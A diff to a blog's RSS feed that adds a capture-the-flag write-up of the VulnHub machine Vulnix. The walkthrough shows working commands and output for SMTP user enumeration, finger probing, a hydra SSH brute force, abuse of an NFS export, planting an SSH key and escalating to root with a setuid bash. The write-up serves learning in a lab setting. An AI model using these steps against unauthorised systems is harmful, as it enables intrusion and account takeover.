@@ -6,9 +6,228 @@
 </description>
     <link>http://a.aronott.com/</link>
     <atom:link href="http://a.aronott.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 28 Jul 2017 07:51:41 -0600</pubDate>
-    <lastBuildDate>Fri, 28 Jul 2017 07:51:41 -0600</lastBuildDate>
+    <pubDate>Sat, 29 Jul 2017 20:37:59 -0600</pubDate>
+    <lastBuildDate>Sat, 29 Jul 2017 20:37:59 -0600</lastBuildDate>
     <generator>Jekyll v3.5.1</generator>
+    
+      <item>
+        <title>Vulnix</title>
+        <description>&lt;p&gt;Vulnix is a boot-to-root vulnerable machine found on &lt;a href=&quot;https://www.vulnhub.com/entry/hacklab-vulnix,48/&quot;&gt;VulnHub&lt;/a&gt;. I pulled this down and ran it in Virtualbox.&lt;/p&gt;
+
+&lt;p&gt;Getting started we will us nmap to enumerate open ports.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p -sV 192.168.1.130
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-16 14:02 EDT
+Nmap scan report for vulnix.hsd1.co.comcast.net (192.168.1.111)
+Host is up (0.00034s latency).
+Not shown: 65518 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+25/tcp open smtp Postfix smtpd
+79/tcp open finger Linux fingerd
+110/tcp open pop3 Dovecot pop3d
+111/tcp open rpcbind 2-4 (RPC #100000)
+143/tcp open imap Dovecot imapd
+512/tcp open exec?
+513/tcp open login
+514/tcp open tcpwrapped
+993/tcp open ssl/imap Dovecot imapd
+995/tcp open ssl/pop3 Dovecot pop3d
+2049/tcp open nfs_acl 2-3 (RPC #100227)
+39127/tcp open mountd 1-3 (RPC #100005)
+46013/tcp open mountd 1-3 (RPC #100005)
+51380/tcp open status 1 (RPC #100024)
+51502/tcp open mountd 1-3 (RPC #100005)
+51986/tcp open nlockmgr 1-4 (RPC #100021)
+MAC Address: 08:00:27:53:D1:AF (Oracle VirtualBox virtual NIC)
+Service Info: Host: vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 78.42 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/initial_nmap.png&quot; alt=&quot;Initial nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can use the postfix server to check for existing users on the machine using the VRFY command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;nc 192.168.1.130 25
+220 vulnix ESMTP Postfix (Ubuntu)
+EHLO example.com
+250-vulnix
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+VRFY root
+252 2.0.0 root
+VRFY aott
+550 5.1.1 &amp;lt;aott&amp;gt;: Recipient address rejected: User unknown in local recipient table
+VRFY admin
+550 5.1.1 &amp;lt;admin&amp;gt;: Recipient address rejected: User unknown in local recipient table
+VRFY vulnix
+252 2.0.0 vulnix
+VRFY dovecot
+252 2.0.0 dovecot&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Using the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp-user-enum&lt;/code&gt; tool we can automate this and use a wordlist.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.130
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+----------------------------------------------------------
+| Scan Information |
+----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
+Target count ............. 1
+Username count ........... 112
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............
+
+######## Scan started at Sat Jul 29 17:33:28 2017 #########
+192.168.1.130: ROOT exists
+192.168.1.130: backup exists
+192.168.1.130: bin exists
+192.168.1.130: daemon exists
+192.168.1.130: games exists
+192.168.1.130: gnats exists
+192.168.1.130: irc exists
+192.168.1.130: libuuid exists
+192.168.1.130: lp exists
+192.168.1.130: list exists
+192.168.1.130: man exists
+192.168.1.130: mail exists
+192.168.1.130: messagebus exists
+192.168.1.130: news exists
+192.168.1.130: nobody exists
+192.168.1.130: postmaster exists
+192.168.1.130: proxy exists
+192.168.1.130: root exists
+192.168.1.130: sshd exists
+192.168.1.130: sync exists
+192.168.1.130: sys exists
+192.168.1.130: syslog exists
+192.168.1.130: user exists
+192.168.1.130: uucp exists
+192.168.1.130: www-data exists
+######## Scan completed at Sat Jul 29 17:33:28 2017 #########
+25 results.
+
+112 queries in 1 seconds (112.0 queries / sec)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can easily write all the existing users to a file to be used later.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.130 | grep exists | cut -d' ' -f2 &amp;gt; users_exist.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Using this list, we can use the fact that the finger port is open to see which of these users have a login shell.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for i in $(cat users_exist.txt); do finger $i@192.168.1.130; done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/fingering.png&quot; alt=&quot;finger&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Knowing the users that have a login shell, we stuff those into a file called users.txt and use hydra to bruteforce a login.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L users.txt -P /usr/share/SecLists/Passwords/10k_most_common.txt 192.168.1.130 ssh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/hydra.png&quot; alt=&quot;hydra&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we have a valid username and password (user:letmein) we can use ssh to get in and start enumeration on the box.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/ssh-in.png&quot; alt=&quot;ssh with low priv&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On the box I start enumeration using steps here https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/exports.png&quot; alt=&quot;/etc/exports&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hmmm&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/vulnix	*(rw,root_squash)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Looking this up I found that the * here is a wildcard meaning that /home/vulnix can be mounted from anywhere. So, let’s mount it to my machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mount_with_permission_denied.png&quot; alt=&quot;mount permission denied&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, we can’t get in there even with root. That’s what that root_squash setting does. We are only going to be able to get in there using the vulnix user, so we create a local vulnix user with the same uid(2008) and gid(2008) as the remote box.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/passwd_file.png&quot; alt=&quot;/etc/passwd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After creating this user and switching, we are able to get into the /mnt/vulnix directory. Here we will create an ssh key that will allow us to ssh directly to the machine using the vulnix user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mounted_as_vulnix.png&quot; alt=&quot;Mounted as vulnix&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen -t rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/create_ssh_key.png&quot; alt=&quot;create ssh key&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/mv_ssh_pub_key.png&quot; alt=&quot;Move pub key&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh vulnix@192.168.1.130 -i /home/vulnix/.ssh/id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/ssh_with_vulnix.png&quot; alt=&quot;SSH as vulnix&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s see what the vulnix user can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/sudo_l.png&quot; alt=&quot;sudo -l&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we are able to edit the /etc/exports file and change that root_squash to no_root_squash.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;editsudo /etc/export
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After changing this file, we would need to restart networking for the changes to take effect. Sadly we don’t have a user that can do that so we just manually reboot this. Obviously in a real situation we don’t have control to do this so we might have to get creative.&lt;/p&gt;
+
+&lt;p&gt;Prior to rebooting, let’s copy /bin/bash to the /home/vulnix directory for some setuid fun.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/copy_bash.png&quot; alt=&quot;copy bash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After the reboot, we remount /home/vulnix and are now able access that directory with the root user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/setuid_bash.png&quot; alt=&quot;set uid&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /mnt/vulnix
+chown root bash
+chmod 4755 bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we have everything we need to escalate to root.&lt;/p&gt;
+
+&lt;p&gt;On the victim machine as the vulnix user, we run &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; to keep permissions of the user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnix/escalation_to_root.png&quot; alt=&quot;Escalate&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;BOOM! Done.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 28 Jul 2017 12:34:00 -0600</pubDate>
+        <link>http://a.aronott.com/ctf/vulnix.html</link>
+        <guid isPermaLink="true">http://a.aronott.com/ctf/vulnix.html</guid>
+        
+        
+        <category>ctf</category>
+        
+      </item>
     
       <item>
         <title>Stapler</title>
